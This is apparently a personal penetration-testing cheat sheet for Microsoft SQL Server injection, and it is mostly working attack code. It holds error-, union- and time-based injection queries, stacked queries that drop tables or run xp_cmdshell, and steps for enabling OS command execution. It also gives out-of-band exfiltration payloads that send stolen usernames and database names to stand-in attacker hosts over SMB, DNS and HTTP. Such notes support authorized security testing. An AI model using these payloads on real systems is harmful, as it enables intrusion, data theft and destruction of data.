# MSSQL Enumeration & SQL Injection Cheat Sheet (VAPT Research Notes)

> Personal research notes for authorized VAPT / lab practices.
> Target engine: Microsoft SQL Server (T-SQL syntax).

---

## 1. Schema Reference

| Object | Type | Purpose |
|---|---|---|
| `dbo` | Default schema | Default owner/schema for tables |
| `sys` | System schema | Metadata: tables, columns, databases, objects |
| `INFORMATION_SCHEMA` | ANSI standard schema | Standardized metadata views (TABLES, COLUMNS, VIEWS) |
| `db_owner` | Database role (not a schema) | Full permissions on the database |
| `db_datareader` | Database role | Read-only access to all tables |

### Key metadata (system catalog) views
```sql
sys.tables
sys.columns
sys.objects
sys.schemas
sys.databases
sys.views
sys.procedures
sys.indexes
sys.sql_modules
```

### Naming convention
```sql
DB_name.schema.Table_name
```

---

## 2. Basic Recon Syntax

```sql
SELECT @@SERVERNAME;                 -- Server name
SELECT @@VERSION;                    -- Full version banner
SELECT DB_NAME();                    -- Current database name
SELECT SUSER_NAME();                 -- Current logged-in (server-level) login
SELECT USER_NAME();                  -- Current database user
SELECT COUNT(*) FROM Table_name;     -- Row count
SELECT name FROM sys.schemas;        -- List schemas
```

---

## 3. Enumerating Databases

```sql
SELECT name, database_id, create_date FROM sys.databases;
SELECT name FROM master.sys.databases;
EXEC sp_databases;
SELECT DB_NAME(id);   -- Increment id from 0 -> 100 to brute-force database names
```

---

## 4. Enumerating Tables

```sql
SELECT table_name FROM INFORMATION_SCHEMA.TABLES;
SELECT name FROM sys.tables;
SELECT name FROM DB_name.sys.tables;
```

---

## 5. Enumerating Columns

```sql
SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'Persons';
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('Persons');
```

---

## 6. Dumping Records

```sql
SELECT * FROM ORG_DB.dbo.Employees;      -- DB_name.Schema.Table_name
SELECT * FROM Persons WHERE ID = 1;
SELECT TOP (10) * FROM Persons;
SELECT * FROM Persons;
```

---

## 7. Error-Based Injection

Common structure — force a type conversion error so the DB engine leaks data in the error message:

```sql
SELECT CONVERT(INT, ());
```

Test case:
```sql
SELECT CONVERT(INT, 'iron');
```

Leak current user via error:
```sql
SELECT CONVERT(INT, (SELECT SUSER_NAME()));
```

### Enumerate DB version
```sql
SELECT CONVERT(INT, @@VERSION);
```
> Note: `version()` is **not** valid T-SQL (that's MySQL/PostgreSQL syntax). Use `@@VERSION` in MSSQL.

### Enumerate database names
```sql
-- Count databases
SELECT CONVERT(INT, CONCAT('No of Database = ', COUNT(*))) FROM sys.databases;

-- Brute force by id (0-100) — good candidate for Burp Intruder
SELECT CONVERT(INT, DB_NAME(id));

-- Enumerate one by one via OFFSET/FETCH (increment the OFFSET value)
SELECT CONVERT(INT, (SELECT name FROM sys.databases ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROW ONLY));
```

### Enumerate table names
```sql
-- Count tables
SELECT CONVERT(INT, CONCAT('No of Tables = ', COUNT(*))) FROM sys.tables;

-- Enumerate one by one (increment OFFSET)
SELECT CONVERT(INT, (SELECT name FROM sys.tables ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROW ONLY));

-- Same via INFORMATION_SCHEMA
SELECT CONVERT(INT, (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES ORDER BY TABLE_NAME OFFSET 3 ROWS FETCH NEXT 1 ROW ONLY));
```

### Enumerate rows (data extraction)
```sql
SELECT CONVERT(INT, (SELECT City FROM ORGDB.dbo.Employees ORDER BY City OFFSET 0 ROWS FETCH NEXT 1 ROW ONLY));
```
Try to change 0 to 100 because that is indexing and here you can see one record at a time.

### Command execution via xp_cmdshell (requires sysadmin privileges)
`xp_cmdshell` is disabled by default and must be explicitly enabled by a privileged account:
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Capture output into a table, then read it back via error-based extraction:
```sql
CREATE TABLE Table_name (
    column_name NVARCHAR(200)
);

INSERT INTO Table_name EXEC xp_cmdshell 'whoami';

-- Then read the result one row/char at a time using the CONVERT + OFFSET technique above
```

---

## 8. Union-Based Injection

```sql
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, @@VERSION;
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, DB_NAME();
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, name FROM Emp;
SELECT username, password FROM users WHERE username='' UNION SELECT NULL, name FROM ORGDB.dbo.Emp;
```

> Tip: column count and data types in the `UNION SELECT` must match the original query — use `ORDER BY n` or trial-and-error with `NULL` placeholders to find the correct column count first.

---

## 9. Time-Based Blind Injection

```sql
IF (SUBSTRING(DB_NAME(), 1, 1) = 'O') WAITFOR DELAY '00:00:05';
IF (LEN(DB_NAME()) = 5) WAITFOR DELAY '00:00:05';
IF (USER_NAME() = 'dbo') WAITFOR DELAY '00:00:05';
```

### Extracting data character-by-character
```sql
IF (SUBSTRING((SELECT username FROM users ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROW ONLY), 1, 1) = 'a')
    WAITFOR DELAY '00:00:05';
```

> Note: `WAITFOR TIME 'hh:mm:ss'` (absolute) is an alternative to `WAITFOR DELAY` (relative) — useful if you want to avoid timing drift across many sequential requests.

---

## 10. Hex Encoding Output

Useful for bypassing filters or safely transporting binary/string data through error messages.

```sql
SELECT CONVERT(VARBINARY(MAX), 'Kaif');
SELECT CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), 'Kaif'), 2);
SELECT CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), (SELECT DB_NAME())), 2);
```

### Error-based extraction with hex-encoded output
```sql
SELECT CONVERT(INT, CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), (SELECT DB_NAME())), 2));
```

---

## 11. Additional Techniques Worth Testing

### Stacked queries
MSSQL supports statement chaining with `;`, which is significant for injection testing:
```sql
'; DROP TABLE test_table--
'; EXEC xp_cmdshell 'whoami'--
```

### Comment syntax
```sql
--   (single-line, note: needs trailing space/newline in some contexts)
/* */ (multi-line)
```

### Out-of-band (OOB) exfiltration
When there's no direct output channel, force the server to reach out to an SMB share you control:
```sql
EXEC master.dbo.xp_dirtree '\\attacker-ip\share';
EXEC master.dbo.xp_fileexist '\\attacker-ip\share\x';
```

### Out-of-band (OOB) exfiltration
Used when there's no visible output channel at all (errors suppressed, no union output, timing too unreliable/noisy). The idea: force the SQL Server process to make an *outbound* network request (SMB or DNS) to a listener you control, encoding stolen data inside the request itself.
 
**Listener setup:** run a DNS server you control (e.g. `dnschef`, `Responder`, or a Burp Collaborator/interactsh instance) or an SMB capture tool (`Responder`, `impacket-smbserver`, or Metasploit's `auxiliary/server/capture/smb`) to log incoming requests.
 
#### SMB-based (UNC path) exfiltration
The classic technique — `xp_dirtree`/`xp_fileexist` force an SMB lookup, and the requesting hostname/share can carry data:
```sql
EXEC master.dbo.xp_dirtree '\\attacker-ip\share';
EXEC master.dbo.xp_fileexist '\\attacker-ip\share\x';
```
 
Encode extracted data directly into the UNC path so it shows up in your listener's logs:
```sql
DECLARE @data VARCHAR(1024);
SELECT @data = (SELECT TOP 1 name FROM sys.databases);
EXEC('master..xp_dirtree "\\' + @data + '.attacker-ip\share"');
```
 
#### DNS-based exfiltration
Same principle, but resolved via `xp_dirtree`/`xp_fileexist`/`xp_subdirs` pointed at a domain you control instead of a raw IP — works even when SMB (port 445) is blocked outbound but DNS isn't:
```sql
DECLARE @data VARCHAR(1024);
SELECT @data = (SELECT SUSER_NAME());
EXEC('master..xp_dirtree "\\' + @data + '.attacker-domain.com\share"');
```
This causes the server to attempt DNS resolution of `<stolen-data>.attacker-domain.com`, which shows up as a query on your authoritative DNS server/listener — no SMB traffic required.
 
#### HTTP-based exfiltration (via OLE Automation, requires sysadmin)
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
 
DECLARE @obj INT, @data VARCHAR(1024);
SELECT @data = (SELECT SUSER_NAME());
EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT;
EXEC sp_OAMethod @obj, 'open', NULL, 'GET', 'http://attacker-ip/?d=' + @data, 'false';
EXEC sp_OAMethod @obj, 'send';
```


#### Why use OOB over error/time-based
- Bypasses response suppression entirely — no need for any visible output
- Faster and more reliable than time-based blind for large data extraction
- DNS variant works even in networks with strict outbound rules (SMB/HTTP blocked but DNS allowed for resolution)


### OPENROWSET (if enabled)
Can be used to read files or make outbound connections — worth exploring in a lab environment:
```sql
SELECT * FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_CLOB) AS Contents;
```

### String concatenation
MSSQL uses `+` for string concatenation (not `CONCAT()` in all contexts, and not `||` like Oracle/PostgreSQL):
```sql
SELECT 'a' + 'b';
```

---

## Disclaimer

These notes are for authorized security testing and educational purposes only — use exclusively against systems you own or have explicit written permission to test.
